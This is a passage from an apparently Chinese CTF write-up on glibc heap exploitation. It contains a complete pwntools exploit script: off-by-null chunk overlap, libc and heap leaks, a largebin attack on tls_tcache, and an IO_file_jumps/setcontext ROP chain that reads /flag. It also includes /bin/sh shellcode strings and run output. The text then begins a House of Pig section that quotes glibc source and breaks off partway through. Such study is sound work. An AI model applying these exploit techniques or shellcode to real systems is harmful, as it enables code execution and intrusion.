class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld-2.32.so&quot;</span>, <span class="string">b&quot;./main&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc-2.32.so&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(: Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;(: Content: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># padding</span></span><br><span class="line">    add(<span class="number">0x2000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">    pad = <span class="number">0x1000</span> - <span class="number">0x2d0</span></span><br><span class="line">    add(pad, <span class="string">b&#x27;pursue&#x27;</span>)     <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># prepare</span></span><br><span class="line">    add(<span class="number">0x508</span>, <span class="string">b&#x27;prev&#x27;</span>)     <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x428</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;victim&#x27;</span>)   <span class="comment"># 5</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 6</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;chunk_a&#x27;</span>)  <span class="comment"># 7</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 8</span></span><br><span class="line">    add(<span class="number">0x518</span>, <span class="string">b&#x27;chunk_b&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">b&#x27;barrier&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create largebin chunk</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># create fake_chuk</span></span><br><span class="line">    fake_size = <span class="number">0x500</span> + <span class="number">0x430</span> + <span class="number">0x500</span></span><br><span class="line">    fake_head = p64(<span class="number">0</span>) + p64(fake_size + <span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x508</span>, fake_head)   <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify b-&gt;fd == p</span></span><br><span class="line">    fd = p8(<span class="number">0x10</span>) + p8(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x518</span>, fd)          <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify a-&gt;bk == p</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;a2&#x27;</span>)       <span class="comment"># 11</span></span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    bk = p64(<span class="number">0</span>) + p8(<span class="number">0x10</span>) + p8(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x4f8</span>, bk)          <span class="comment"># 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set next_chunk-&gt;pre_size = chunk-&gt;size</span></span><br><span class="line">    add(<span class="number">0x4f8</span>, <span class="string">b&#x27;victim2&#x27;</span>)  <span class="comment"># 11</span></span><br><span class="line">    pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4f0</span> + p64(fake_size)</span><br><span class="line">    edit(<span class="number">4</span>, pld)    <span class="comment"># off-by-null</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># success</span></span><br><span class="line">    delete(<span class="number">11</span>)  <span class="comment"># the new merged chunk is overlapped with the prev chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    add(<span class="number">0x4f8</span> + <span class="number">0x430</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 12</span></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    libc_base = uu64() - <span class="number">0x1e4170</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mlibc_base-&gt;0x%x\033[0m&#x27;</span> % libc_base)</span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap         </span></span><br><span class="line">    add(<span class="number">0x4f8</span> + <span class="number">0x420</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 13</span></span><br><span class="line">    show(<span class="number">4</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3930</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mheap_base-&gt;0x%x\033[0m&#x27;</span> % heap_base)</span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">    tls_tcache = libc_base + <span class="number">0x1eb578</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mtls_tcache-&gt;0x%x\033[0m&#x27;</span> % tls_tcache)</span><br><span class="line">    io_file_jumps = libc_base + <span class="number">0x1e54c0</span></span><br><span class="line">    io_file_sync = io_file_jumps + <span class="number">0x60</span></span><br><span class="line">    io_helper_jumps = libc_base + <span class="number">0x1e48c0</span>      <span class="comment"># 0x1e4980</span></span><br><span class="line">    setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;\033[32msetcontext-&gt;0x%x\033[0m&#x27;</span> % setcontext)</span><br><span class="line">    success(<span class="string">&#x27;\033[32mio_file_sync-&gt;0x%x\033[0m&#x27;</span> % io_file_sync)</span><br><span class="line">    success(<span class="string">&#x27;\033[32mio_helper_jumps-&gt;0x%x\033[0m&#x27;</span> % io_helper_jumps)</span><br><span class="line"></span><br><span class="line">    p_rdi_r = libc_base + <span class="number">0x000000000002858f</span></span><br><span class="line">    p_rsi_r = libc_base + <span class="number">0x000000000002ac3f</span></span><br><span class="line">    p_rdx_r12_r = libc_base + <span class="number">0x0000000000114161</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mp_rdi_r-&gt;0x%x\033[0m&#x27;</span> % p_rdi_r)</span><br><span class="line">    op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;\033[32mop-&gt;0x%x\033[0m&#x27;</span> % op)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = SigreturnFrame()</span></span><br><span class="line">    <span class="comment"># frame.rsp = heap_base + 0x4a60 + 0x20   # orw_addr</span></span><br><span class="line">    <span class="comment"># frame.rip = p_rdi_r + 1                 # ret</span></span><br><span class="line"></span><br><span class="line">    orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">    orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0xa0</span>)</span><br><span class="line">    orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(op)</span><br><span class="line">    orw += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0x120</span>)</span><br><span class="line">    orw += p64(rd)</span><br><span class="line">    orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0x120</span>)</span><br><span class="line">    orw += p64(pt)</span><br><span class="line">    orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># largebin attack to tls_tcache</span></span><br><span class="line">    add(<span class="number">0x4c8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 11</span></span><br><span class="line">    add(<span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 14b </span></span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x430</span>) + p64(<span class="number">501</span>)</span><br><span class="line">    add(<span class="number">0x438</span>, pld)   <span class="comment"># 15</span></span><br><span class="line">    add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 16</span></span><br><span class="line">    add(<span class="number">0x1a8</span>, <span class="string">b&#x27;pursue&#x27;</span>)   <span class="comment"># 17</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 3</span></span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x510</span>) + p64(<span class="number">0x431</span>)</span><br><span class="line">    pld += p64(libc_base + <span class="number">0x1e3ff0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0x3510</span>) + p64(tls_tcache - <span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">0x438</span>, pld)         <span class="comment"># 14</span></span><br><span class="line">    delete(<span class="number">16</span>)</span><br><span class="line">    add(<span class="number">0x1000</span>, <span class="string">b&#x27;pursue&#x27;</span>)  <span class="comment"># 16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake tcache_struct</span></span><br><span class="line">    add(<span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    top_chunk = heap_base + <span class="number">0xa0e0</span></span><br><span class="line">    success(<span class="string">&#x27;\033[32mtop_chunk-&gt;0x%x\033[0m&#x27;</span> % top_chunk)</span><br><span class="line">    pld = p64(<span class="number">0</span>) * <span class="number">4</span> + <span class="string">b&#x27;\x01&#x27;</span> * <span class="number">0x80</span> </span><br><span class="line">    pld += p64(io_file_sync) * <span class="number">20</span> </span><br><span class="line">    pld += p64(io_helper_jumps + <span class="number">0xa0</span>) * <span class="number">10</span></span><br><span class="line">    pld += p64(top_chunk) * <span class="number">10</span> </span><br><span class="line">    add(<span class="number">0x438</span>, pld)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    add(<span class="number">0x518</span>, orw)                     <span class="comment"># orw</span></span><br><span class="line">    add(<span class="number">0x108</span>, p64(setcontext + <span class="number">61</span>))    <span class="comment"># io_file_syn -&gt; setcontext + 61</span></span><br><span class="line">    add(<span class="number">0x188</span>, p64(heap_base + <span class="number">0x4a60</span> + <span class="number">0x20</span>) + p64(p_rdi_r + <span class="number">1</span>))     <span class="comment"># io_helper_jumps + 0xa8 &amp; 0xa0 -&gt; rop_init</span></span><br><span class="line">    add(<span class="number">0x228</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x520</span>))     <span class="comment"># top_chunk.size -&gt; 0x520</span></span><br><span class="line"></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;(: Size: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span> :</span><br><span class="line">            sh = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">            pwn()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> :</span><br><span class="line">            sh.close()</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure>

<p>攻击成功时也是会返给我们断言的信息的，这也可以帮助我们检查是不是触发了断言，如下所示：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始爆破</span></span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1089)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1091</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1091)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1093</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1093)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1095</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1095)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1097</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1097)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1099</span><br><span class="line">[*] Process &#x27;./main&#x27; stopped with exit code -6 (SIGABRT) (pid 1099)</span><br><span class="line">[+] Starting local process &#x27;./main&#x27;: pid 1101</span><br><span class="line">exp.py:29: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  uu64    = lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">[+] libc_base-&gt;0x7f81b31a4000</span><br><span class="line">[+] heap_base-&gt;0x55958ac4d000</span><br><span class="line">[+] tls_tcache-&gt;0x7f81b338f578</span><br><span class="line">[+] setcontext-&gt;0x7f81b31f7030</span><br><span class="line">[+] io_file_sync-&gt;0x7f81b3389520</span><br><span class="line">[+] io_helper_jumps-&gt;0x7f81b33888c0</span><br><span class="line">[+] p_rdi_r-&gt;0x7f81b31cc58f</span><br><span class="line">[+] op-&gt;0x7f81b32ac9b0</span><br><span class="line">[+] top_chunk-&gt;0x55958ac570e0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">返还给我们断言信息</span></span><br><span class="line">main: malloc.c:2394: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)&#x27; failed.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">成功</span></span><br><span class="line">flag&#123;!!success!!&#125;		</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Pig"><a href="#House-Of-Pig" class="headerlink" title="House_Of_Pig"></a>House_Of_Pig</h2><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要适用于程存在calloc，无法从tcache中拿取chunk，核心是利用<code>_IO_str_jumps</code>中的<code>_IO_str_overflow</code>函数执行一系列的malloc、memcpy和free操作，主要的攻击思路会在例题中给出，先看一下源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1</span></span><br><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="comment">// #define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br><span class="line">      <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          <span class="built_in">free</span> (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"> </span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span 